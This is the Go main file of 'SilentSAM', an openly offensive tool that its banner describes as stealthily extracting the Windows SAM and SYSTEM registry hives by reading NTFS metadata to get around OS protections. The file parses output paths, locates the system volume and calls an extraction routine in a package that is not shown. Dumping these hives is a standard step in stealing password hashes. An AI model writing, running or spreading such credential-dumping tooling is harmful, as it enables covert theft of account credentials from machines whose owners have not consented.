package main

import (
	"os"
	"SilentSAM/sam"
	"fmt"
	"log"
)

func displayBanner() {
	fmt.Println("\n")
	fmt.Println("  █████████   ███  ████                       █████     █████████    █████████   ██████   ██████")
	fmt.Println(" ███░░░░░███ ░░░  ░░███                      ░░███     ███░░░░░███  ███░░░░░███ ░░██████ ██████ ")
	fmt.Println("░███    ░░░  ████  ░███   ██████  ████████   ███████  ░███    ░░░  ░███    ░███  ░███░█████░███ ")
	fmt.Println("░░█████████ ░░███  ░███  ███░░███░░███░░███ ░░░███░   ░░█████████  ░███████████  ░███░░███ ░███ ")
	fmt.Println(" ░░░░░░░░███ ░███  ░███ ░███████  ░███ ░███   ░███     ░░░░░░░░███ ░███░░░░░███  ░███ ░░░  ░███ ")
	fmt.Println(" ███    ░███ ░███  ░███ ░███░░░   ░███ ░███   ░███ ███ ███    ░███ ░███    ░███  ░███      ░███ ")
	fmt.Println("░░█████████  █████ █████░░██████  ████ █████  ░░█████ ░░█████████  █████   █████ █████     █████")
	fmt.Println(" ░░░░░░░░░  ░░░░░ ░░░░░  ░░░░░░  ░░░░ ░░░░░    ░░░░░   ░░░░░░░░░  ░░░░░   ░░░░░ ░░░░░     ░░░░░ ")
	fmt.Println("                                                                                                 ")
	fmt.Println("SilentSAM: Stealth SAM Extraction Tool, made with love by @Ryukk33.")

	fmt.Println("Extract the SAM database using NTFS metadata and bypass OS-level protections.")
	fmt.Println()
}

func main() {
	displayBanner()

	if len(os.Args) < 3 {
		log.Fatalf("Usage: %s system-output-file sam-output-file\n", os.Args[0])
	}

	systemDestFile := os.Args[1]
	samDestFile := os.Args[2]

	log.Printf("Listing available volumes...")
	volumePath := sam.FindSystemVolume()
	if volumePath == "" {
		log.Fatalf("No system volume found.")
	}

	sam.ExtractSystemFiles(volumePath, map[string]string{"SYSTEM": systemDestFile, "SAM": samDestFile})
}
